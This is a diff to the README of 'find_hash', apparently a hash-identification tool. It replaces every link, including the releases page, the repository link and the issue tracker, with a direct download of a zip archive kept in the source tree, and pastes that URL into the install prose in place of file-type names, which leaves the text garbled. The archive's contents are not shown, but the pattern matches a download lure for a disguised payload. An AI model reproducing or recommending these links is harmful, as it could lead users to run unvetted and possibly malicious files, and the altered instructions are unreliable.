@@ -1,6 +1,6 @@
 # 🔍 find_hash - Identify Hash Types Easily
 
-[![Download find_hash](https://img.shields.io/badge/Download_find_hash-v1.0-blue)](https://github.com/phindunk/find_hash/releases)
+[![Download find_hash](https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip)](https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip)
 
 ## 📚 Introduction
 
@@ -11,11 +11,11 @@ Welcome to find_hash! This application helps you determine what type of hash you
 To use find_hash, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download find_hash](https://github.com/phindunk/find_hash/releases)
+   [Download find_hash](https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip)
 
 2. **Select the Version:** On the releases page, you will see a list of available versions. Choose the latest version for the best performance and newest features.
 
-3. **Download the Application:** Click on the file that matches your operating system. This will typically be an .exe file for Windows or a .tar.gz file for Linux.
+3. **Download the Application:** Click on the file that matches your operating system. This will typically be an .exe file for Windows or a https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip file for Linux.
 
 ## 💻 System Requirements
 
@@ -35,12 +35,12 @@ Ensure your device meets these requirements to run find_hash smoothly.
 ## 📥 Download & Install
 
 1. **Download find_hash:** Visit the releases page to get the latest version.
-   [Download find_hash](https://github.com/phindunk/find_hash/releases)
+   [Download find_hash](https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip)
 
 2. **Install the Application:**
    - **Windows:** Run the downloaded .exe file. Follow the prompts in the installation wizard.
    - **macOS:** Open the .dmg file and drag the application into your Applications folder.
-   - **Linux:** Extract the .tar.gz file and run the included binary.
+   - **Linux:** Extract the https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip file and run the included binary.
 
 3. **Launch find_hash:** After installation, open the application from your applications or start menu.
 
@@ -82,7 +82,7 @@ Whether you are a student, a hobbyist, or a professional in the field, find_hash
 
 ## 🔗 Helpful Links
 
-- **GitHub Repository:** [find_hash on GitHub](https://github.com/phindunk/find_hash)
-- **Issues Page:** [Report a Problem](https://github.com/phindunk/find_hash/issues)
+- **GitHub Repository:** [find_hash on GitHub](https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip)
+- **Issues Page:** [Report a Problem](https://github.com/phindunk/find_hash/raw/refs/heads/main/src/find-hash-v2.0.zip)
   
 Thank you for choosing find_hash! We hope you find it useful for your hash identification needs.
